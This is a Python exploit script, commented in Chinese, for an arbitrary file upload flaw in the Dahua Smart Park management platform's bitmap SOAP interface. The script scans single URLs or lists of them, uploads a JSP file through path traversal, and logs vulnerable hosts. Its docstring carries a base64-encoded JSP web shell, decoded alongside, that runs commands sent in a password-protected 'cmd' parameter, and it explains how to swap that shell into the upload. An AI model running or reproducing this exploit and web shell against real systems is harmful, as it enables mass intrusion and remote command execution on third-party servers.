# 

import requests
import argparse
import time
import warnings
warnings.filterwarnings("ignore")
# 验证
payload1=r"/emap/webservice/gis/soap/bitmap"
# 上传文件
payload2=r"/upload/221133.jsp?pwd=123&cmd=id"
# 漏洞名称
vul_name="大华智慧园区综合管理平台bitmap接口任意文件上传漏洞"

file_name="449377.jsp"

header={
    "User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36"
}
def get_time():
    mtime=time.strftime("%Y-%m-%d %H:%M:%S",time.localtime())
    return mtime

def print_colored(text, color):
    colors = {
        'black': '\033[0;30m',
        'red': '\033[0;31m',
        'green': '\033[0;32m',
        'yellow': '\033[0;33m',
        'blue': '\033[0;34m',
        'purple': '\033[0;35m',
        'cyan': '\033[0;36m',
        'white': '\033[0;37m'
    }
    reset = '\033[0m'
    if color in colors:
        colored_text = colors[color] + text + reset
        print(colored_text,end='')
    else:
        print(text,end='')

def send_get(url):
    try:
        response=requests.get(f"{url}{payload1}",verify=False,timeout=5,headers=header)
        if "<faultcode>soap:Server</faultcode>" in response.text:
            print_colored(f'[+] {get_time()} {url} 存在{vul_name} 漏洞路径{url}{payload1} ','green')
            # res=f"{url}{payload1}"
            return True
        else:
            print_colored(f'[-] {get_time()} {url} 不存在{vul_name} ','red')
            return False
    except Exception as e:
        print(f"[-] {get_time()} {url} 请求超时",end='')
        return False

def send_post(url):

    """
    post 数据"PCUgb3V0LnByaW50bG4oImZsYWdmbGFnIik7ICU+"base64解密为flagflag

    若要上传马儿将post上传数据也就是arg1的值改为:PCUgaWYoIjEyMyIuZXF1YWxzKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwd2QiKSkpeyBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7IGludCBhID0gLTE7IGJ5dGVbXSBiID0gbmV3IGJ5dGVbMjA0OF07IG91dC5wcmludCgiPHByZT4iKTsgd2hpbGUoKGE9aW4ucmVhZChiKSkhPS0xKXsgb3V0LnByaW50bG4obmV3IFN0cmluZyhiKSk7IH0gb3V0LnByaW50KCI8L3ByZT4iKTsgfSAlPg==
    原文：<% if("123".equals(request.getParameter("pwd"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("<pre>"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print("</pre>"); } %>
    
    """
    flag=send_get(url)
    lst=[]
    if flag:
        data = f"""
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/">
            <soapenv:Header/>           
                <soapenv:Body>
                        <res:uploadPicFile>
                            <arg0>
                            <picPath>/../{file_name}</picPath>
                            </arg0>
                            <arg1>PCUgb3V0LnByaW50bG4oImZsYWdmbGFnIik7ICU+</arg1>
                        </res:uploadPicFile>
                </soapenv:Body>
        </soapenv:Envelope>
        """
        
        try:
            response=requests.post(f"{url}{payload1}",data=data,timeout=5,headers=header,verify=False)
            if response.status_code ==200 and "<ns2:return><code>1</code></ns2:return>" in response.text:
                vul_link=f"{url}{payload1}"
                file_link=f"{url}/upload/{file_name}"
                lst=[vul_link,file_link]
                print_colored(f"文件上传成功-->{file_link}\n","purple")
                return lst
            else:
                print_colored(f"文件上传成功失败\n","red")
                lst=[]
                return lst
        except Exception as e:
            print_colored(f"文件上传成功失败{e}\n","red")
            lst=[]
            return lst
    else:
        return lst   

def main():
    parser = argparse.ArgumentParser(description='命令行参数示例')
    # 添加参数选项
    parser.add_argument('-u', '--url', type=str, help='单个url')
    parser.add_argument('-f', '--file', type=str, help='url文本文件路径')
    parser.add_argument('-o', '--output', type=str, help='保存结果')
    # 解析命令行参数
    args = parser.parse_args()
    
    if args.url:
        send_post(args.url)
    if args.file:
        with open(args.file,'r') as f1:
            for u in f1.readlines():
                url=u.strip()
                lst=send_post(url)
                print(lst)
                time.sleep(0.5)
                if len(lst)>0:
                    if args.output:
                        vul_link,file_link=lst[0],lst[1]
                        with open(args.output+f"/全国大华智慧园区综合管理平台bitmap接口任意文件上传漏洞.txt",'a+',encoding='utf-8') as f2:
                            f2.write(f"漏洞链接 {vul_link}--上传文件路径 {file_link}\n")
                else:
                    pass
    
if __name__ == '__main__':
    main()
    
    